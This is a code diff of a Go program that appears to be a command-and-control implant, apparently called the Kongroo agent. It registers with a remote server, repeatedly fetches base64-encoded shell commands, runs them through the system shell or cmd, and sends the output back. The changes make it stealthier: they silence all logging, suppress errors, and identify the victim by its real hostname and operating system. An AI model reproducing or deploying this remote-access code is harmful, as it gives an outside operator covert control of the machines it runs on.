@@ -2,14 +2,19 @@ package main
 
 import (
 	"bytes"
+	"crypto/md5"
 	b64 "encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
+	"strconv"
+
+	//"log"
 	"net/http"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 	"time"
 
@@ -30,14 +35,16 @@ func encryptDecrypt(input string, key int) (output string) {
 	}
 	return output
 }
-func registerKongrooAgent(hostname, pcname, platform string) {
+func registerKongrooAgent(hostname, pcname, pcid, timestamp, platform string) {
 
-	httpposturl := "http://" + hostname + ":8080/reg/" + pcname
+	httpposturl := "http://" + hostname + ":8080/reg/" + pcid
 	var jsonData = []byte(fmt.Sprintf(`{
+		"PCID": "%s",
 		"Name": "%s",
 		"IP": "",
-		"Platform": "%s"
-	}`, pcname, platform))
+		"Platform": "%s",
+		"Timestamp": "%s"
+	}`, pcid, pcname, platform, timestamp))
 	request, err := http.NewRequest("POST", httpposturl, bytes.NewBuffer(jsonData))
 	request.Header.Set("Content-Type", "application/json; charset=UTF-8")
 
@@ -47,15 +54,16 @@ func registerKongrooAgent(hostname, pcname, platform string) {
 		panic(err)
 	}
 	defer response.Body.Close()
-	fmt.Println("response Status:", response.Status)
-	fmt.Println("response Headers:", response.Header)
-	body, _ := ioutil.ReadAll(response.Body)
-	fmt.Println("response Body:", string(body))
+	// fmt.Println("response Status:", response.Status)
+	// fmt.Println("response Headers:", response.Header)
+	// body, _ := ioutil.ReadAll(response.Body)
+	// fmt.Println("response Body:", string(body))
 }
-func checkNewTasks(hostname, pcname string) (string, bool) {
-	resp, err := http.Get("http://" + hostname + ":8080/tasks/" + pcname)
+func checkNewTasks(hostname, pcid string) (string, bool) {
+	resp, err := http.Get("http://" + hostname + ":8080/tasks/" + pcid)
 	if err != nil {
-		log.Fatalln(err)
+		// log.Fatalln(err)
+		return "", false
 	}
 	if resp.StatusCode == 404 {
 		return "", false
@@ -74,20 +82,20 @@ func checkNewTasks(hostname, pcname string) (string, bool) {
 	body = body[:]
 	sEnc := string(body)
 	sDec, _ := b64.StdEncoding.DecodeString(sEnc)
-	log.Printf(string(sDec))
+	// log.Printf(string(sDec))
 	return string(sDec), true
 
 }
 func executeTask(task, platform string) command {
 	var result []byte
-	var err error
+	// var err error
 
 	switch platform {
-	case "MacOS":
+	case "linux":
 		splitTask := strings.Split(task, " ")
-		result, err = exec.Command(splitTask[0], splitTask[1:]...).CombinedOutput()
-		log.Println("Result of command", string(result), "error", err)
-	case "Windows":
+		result, _ = exec.Command(splitTask[0], splitTask[1:]...).CombinedOutput()
+		// log.Println("Result of command", string(result), "error", err)
+	case "windows":
 		result, _ = exec.Command("cmd", "/c", task).CombinedOutput()
 	default:
 		result = []byte("")
@@ -99,12 +107,12 @@ func executeTask(task, platform string) command {
 		task:   task,
 		result: string(sEnc),
 	}
-	log.Println("Sending", taskResult.result)
+	//log.Println("Sending", taskResult.result)
 	return taskResult
 }
 
-func postResults(hostname, pcname string, result command) {
-	httpposturl := "http://" + hostname + ":8080/tasks/" + pcname
+func postResults(hostname, pcid string, result command) {
+	httpposturl := "http://" + hostname + ":8080/tasks/" + pcid
 	var jsonData = []byte(fmt.Sprintf(`{
 		"Command": "%s",
 		"Output": "%s"
@@ -145,18 +153,29 @@ func main() {
 			log.Fatal(err)
 		}
 	*/
-	platform := "MacOS"
-	pcname := "DESKTOP2"
+
+	platform := runtime.GOOS
+	pcname, err := os.Hostname()
+	if err != nil {
+		pcname = "ERRORHOSTNAME"
+	}
+	t := time.Now()
+	tUnix := strconv.FormatInt(t.Unix(), 10)
+	hasher := md5.New()
+	hasher.Write([]byte(pcname + string(tUnix)))
+	pcid := hex.EncodeToString(hasher.Sum(nil))
+	pcid = pcid[:6]
+	// log.Println(pcid)
 	//Register new agent
-	registerKongrooAgent(configs.Hostname, pcname, platform)
+	registerKongrooAgent(configs.Hostname, pcname, pcid, tUnix, platform)
 	sleepTimer := 2
 	for {
-		if task, ok := checkNewTasks(configs.Hostname, pcname); ok == true {
+		if task, ok := checkNewTasks(configs.Hostname, pcid); ok == true {
 			if splitTask := strings.Split(task, " "); splitTask[0] == "cd" {
 				changeDirectory(strings.Join(splitTask[1:], " "))
 			} else {
 				result := executeTask(task, platform)
-				postResults(configs.Hostname, pcname, result)
+				postResults(configs.Hostname, pcid, result)
 			}
 			if sleepTimer > 3 {
 				sleepTimer -= 2
